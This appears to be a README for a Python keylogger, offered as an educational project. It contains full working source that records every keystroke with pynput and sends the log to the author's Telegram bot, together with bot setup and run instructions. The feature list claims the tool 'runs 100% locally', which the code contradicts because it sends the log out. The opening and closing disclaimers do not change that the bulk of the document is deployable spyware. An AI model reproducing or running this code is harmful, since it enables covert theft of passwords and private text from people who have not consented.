# KeyTrack-Lab 🔐

A simple Python keylogger designed for cybersecurity education and personal learning. This project captures keystrokes locally and sends them to your Telegram account via a bot. Ideal for practicing ethical hacking, input monitoring, and bot-based alerting.

> ⚠️ This tool is for **educational use only**. Never deploy keyloggers without **explicit permission**. Misuse may be illegal.

---

## 🛠 Features

- Logs all keystrokes in real time
- Sends keystroke logs to Telegram when stopped
- Simple, readable Python code
- Runs 100% locally

---

## 📦 Requirements

- Python 3.x
- Telegram Account
- Telegram Bot
- Libraries:
  ```bash
  pip install pynput requests
<p align="Center">
  <img src="Screenshots/pynput install.jpg" width="800"/>
</p>

---

🤖 Setup Instructions
1. Create a Telegram Bot

    Search for @BotFather on Telegram

    Send /newbot and follow the prompts

    Copy your Bot Token
<p align="left">
  <img src="Screenshots/Tele Bot Create.jpg" width="450"/>
</p>

2. Get Your Chat ID

    Start a chat with your bot by sending it any message (e.g., "Hello")

    Visit the following in your browser:

    https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates

    Look for "chat": {"id": YOUR_CHAT_ID} in the JSON response

<p align="center">
  <img src="Screenshots/Chat ID.jpg" width="250"/>
</p>


🧪 Usage
1. Save the script below as keylogger_telegram.py:
<p align="center">
  <img src="Screenshots/API + Chat ID .jpg" width="500"/>
</p>

```python
import requests
from pynput import keyboard

BOT_TOKEN = "TELEGRAM BOT API TOKEN"
CHAT_ID = "CHATID"

log = ""

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    requests.post(url, data=payload)

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        else:
            log += f" [{key.name}] "

def on_release(key):
    if key == keyboard.Key.esc:
        send_telegram_message("Keylogger stopped. Logged keys:")
        send_telegram_message(log)
        print("Logging stopped and sent to Telegram.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
2. Run the script:
```bash
python keylogger_telegram.py
```
3. To stop logging:

    Press the Esc key

    The full log will be sent to your Telegram chats

<p align="center">
  Desktop Notification
</p>

<p align="center">
  <img src="Screenshots/Desktop Notif.jpg" width="400"/>
</p>

<p align="center">
  Moblie Notification
</p>

<p align="center">
  <img src="Screenshots/Mobile Notif.jpg" width="400"/>
</p>

🔒 Ethics & Legal Disclaimer

This tool is meant for local use, educational purposes, and authorized testing only. Unauthorized use of keyloggers is illegal in many jurisdictions. Always ensure you have explicit consent before monitoring any input.
